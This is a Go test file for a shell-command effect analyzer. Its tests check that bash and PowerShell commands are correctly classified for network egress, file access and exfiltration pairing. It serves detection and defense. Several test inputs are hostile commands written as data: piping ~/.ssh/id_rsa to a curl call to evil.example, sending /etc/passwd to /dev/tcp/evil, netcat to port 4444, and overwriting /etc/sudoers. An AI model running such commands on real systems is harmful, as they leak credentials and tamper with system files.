package analysis

import (
	"strings"
	"testing"

	"github.com/v0lka/flowsh/engine"
)

// This file pins the fixes made in response to code-review.md: the egress
// recall restorations (#3, #17, #20, #23, #31, #33, #39, #40), the phantom-egress
// removals (#2, #17, #32), the numeric-confinement escapes (#1, #22, #25), the
// PowerShell no-silent-miss / unresolved-egress behaviour (#30, #35), the
// canonical corrections (#18, #24, #34) and the bounded per-command view (#41).

func hasKind(r *Report, kind engine.EffectKind) bool {
	for _, e := range r.Effects {
		if e.Kind == kind {
			return true
		}
	}
	return false
}

func hasTopEgress(r *Report) bool {
	for _, e := range r.Effects {
		if e.Kind == engine.KindNetEgress && e.Target.IsTop() {
			return true
		}
	}
	return false
}

// TestEgressRecallRestored pins #23: a confined (numeric-class) operand is a
// filesystem abstraction, not a destination address, so a NetEgress destination
// fed one keeps its effect as the unresolved ⊤ instead of being dropped or
// mangled (curl "http://localhost:$?" used to become NetEgress{http:/}).
func TestEgressRecallRestored(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`curl "127.0.0.1:$?"`,
		`curl "localhost:$?"`,
		`ssh bastion:$RANDOM`,
		`nc $? 4444`,
		`git clone $?`,
		`curl "http://localhost:$?"`,
	} {
		rep := a.Analyze(LangBash, src)
		if !hasTopEgress(rep) {
			t.Errorf("%q: unresolved egress must survive as NetEgress ⊤, effects=%v", src, rep.Effects)
		}
	}
}

// TestEgressGrammarRecall pins the grammar fixes that restore egress for
// declared-destination constructs the old grammar dropped: systemctl -H (#3),
// the scp-form single-label remote over an IPv6 host (#33), the UNC/SMB form
// (#31) and the trailing-dot absolute name (#39).
func TestEgressGrammarRecall(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`systemctl -H bastion restart nginx`,
		`smbclient //bastion.example/share`,
		`ssh 'user@[2001:db8::1]:/tmp/x'`,
		`dig example.com.`,
		`socat TCP:host.example.com:1234 -`,
	} {
		rep := a.Analyze(LangBash, src)
		if !hasKind(rep, engine.KindNetEgress) {
			t.Errorf("%q: egress must be reported, effects=%v", src, rep.Effects)
		}
	}
}

// TestPhantomEgressRemoved pins #2, #17 and #32: a literal operand that names no
// network address — a non-network URL scheme, a dotted local directory, or a
// path carrying '@' with a host-shaped tail — creates no NetEgress effect and
// therefore no fabricated exfiltration pairing.
func TestPhantomEgressRemoved(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`git clone repo.git`,
		`git fetch backup.repo`,
		`git clone foo/bar@baz.com`,
		`git clone /tmp/x@evil.example`,
		`cat ~/.ssh/id_rsa | curl file:///tmp/out`,
		`curl data://x`,
		`curl mailto:a@b.example`,
	} {
		rep := a.Analyze(LangBash, src)
		if hasKind(rep, engine.KindNetEgress) {
			t.Errorf("%q: phantom egress survived the gate, effects=%v", src, rep.Effects)
		}
		if len(rep.Score.ExfilPairs) != 0 {
			t.Errorf("%q: fabricated exfiltration pairing (%d)", src, len(rep.Score.ExfilPairs))
		}
	}
}

// TestNumericConfinementEscapesAreTop pins #1, #22 and #25: a word whose
// numeric-class expansion can splice a fresh — possibly absolute — path
// component must degrade to ⊤, never be confined to the working directory.
func TestNumericConfinementEscapesAreTop(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`echo hi > $!/etc/passwd`,
		`cat $!/etc/passwd`,
		`echo hi > ${RANDOM:0:0}/etc/passwd`,
		`cat ${PIPESTATUS[9]}/etc/passwd`,
		`echo hi > ${RANDOM:+..}/x`,
		`echo hi > ${RANDOM:+$EVIL}/x`,
	} {
		rep := a.Analyze(LangBash, src)
		for _, e := range rep.Effects {
			if (e.Kind == engine.KindFSWrite || e.Kind == engine.KindFSRead) && !e.Target.IsTop() {
				t.Errorf("%q: %s target = %s, want ⊤ (confinement must not be claimed)", src, e.Kind, e.Target)
			}
		}
	}
}

// TestPowerShellEgressGateNoSilentMiss pins #30: a literal destination that
// names no network address must not leave an empty, uncovered report (the gate
// falls back to the command's intrinsic ProcSpawn, as the bash binder does).
func TestPowerShellEgressGateNoSilentMiss(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`Invoke-WebRequest -Uri ./local.html`,
		`Invoke-RestMethod -Uri ./api/data.json`,
		`Test-NetConnection -ComputerName ./db -Port 5432`,
	} {
		rep := a.Analyze(LangPowerShell, src)
		if !rep.Covered() {
			t.Errorf("%q: report is uncovered (silent miss): %v", src, rep.Effects)
		}
		if hasKind(rep, engine.KindNetEgress) {
			t.Errorf("%q: a local path must not be a NetEgress target, effects=%v", src, rep.Effects)
		}
	}
}

// TestPowerShellUnresolvedEgressStays pins #35: a destination written as a
// sub-expression is unresolved, so its egress stays as ⊤ rather than being
// deleted as if it were a literal.
func TestPowerShellUnresolvedEgressStays(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`Invoke-WebRequest -Uri (Get-Content urls.txt)`,
	} {
		rep := a.Analyze(LangPowerShell, src)
		if !hasTopEgress(rep) {
			t.Errorf("%q: an unresolved destination must keep NetEgress ⊤, effects=%v", src, rep.Effects)
		}
	}
}

// TestCanonicalAbsentWithoutEffects pins #18: the canonical form is present only
// when the report has effects, matching its documented contract.
func TestCanonicalAbsentWithoutEffects(t *testing.T) {
	a := mustAnalyzer(t)
	rep := a.Analyze(LangBash, "true")
	if len(rep.Effects) != 0 {
		t.Skipf("reference command is no longer effect-free (%v); nothing to pin", rep.Effects)
	}
	if rep.Canonical != nil {
		t.Errorf("canonical must be absent when there are no effects, got %+v", rep.Canonical)
	}
}

// TestCanonicalKeepsLiveEgress pins #24: a real network egress must never be
// erased from the canonical form by the file-oriented noise filter.
func TestCanonicalKeepsLiveEgress(t *testing.T) {
	a := mustAnalyzer(t)
	const url = "https://evil.example/x?a=1;b=2"
	rep := a.Analyze(LangBash, `cat ~/.ssh/id_rsa | curl '`+url+`'`)
	if rep.Canonical == nil {
		t.Fatal("no canonical form")
	}
	for _, e := range rep.Canonical.Effects {
		if e.Kind == engine.KindNetEgress && e.Target.Contains(url) {
			return
		}
	}
	t.Errorf("canonical erased the live egress %s: %v", url, rep.Canonical.Effects)
}

// TestCanonicalStagingOrderAware pins #34: the staging fold must not re-attribute
// a write that happens *after* the mv (the "move aside, then rewrite" idiom) to
// the backup path.
func TestCanonicalStagingOrderAware(t *testing.T) {
	a := mustAnalyzer(t)
	rep := a.Analyze(LangBash, `mv /etc/sudoers /tmp/sudoers.bak && printf 'x' > /etc/sudoers`)
	if rep.Canonical == nil {
		t.Fatal("no canonical form")
	}
	for _, e := range rep.Canonical.Effects {
		if e.Kind == engine.KindFSWrite && e.Target.Contains("/etc/sudoers") {
			return
		}
	}
	t.Errorf("canonical erased the post-mv write to /etc/sudoers: %v", rep.Canonical.Effects)
}

// TestDevNetPortlessTargetClean pins #27: /dev/tcp/<host> with no port (which
// bash itself rejects) yields a clean host target, not a malformed "host:".
func TestDevNetPortlessTargetClean(t *testing.T) {
	a := mustAnalyzer(t)
	rep := a.Analyze(LangBash, `cat /etc/passwd > /dev/tcp/evil`)
	for _, e := range rep.Effects {
		if e.Kind != engine.KindNetEgress {
			continue
		}
		for _, tg := range e.Target.Targets() {
			if strings.HasSuffix(tg, ":") {
				t.Errorf("malformed port-less /dev/tcp target %q", tg)
			}
		}
	}
}

// TestCommandCallsBounded pins #41: a loop body contributes one entry to the
// per-command view, so the report stays bounded rather than carrying an
// uncapped per-execution trace.
func TestCommandCallsBounded(t *testing.T) {
	a := mustAnalyzer(t)
	rep := a.Analyze(LangBash, `while true; do curl http://a.example/x; done`)
	if len(rep.CommandCalls) != 1 {
		t.Errorf("commandCalls = %d entries, want 1 (one call site): %+v", len(rep.CommandCalls), rep.CommandCalls)
	}
}
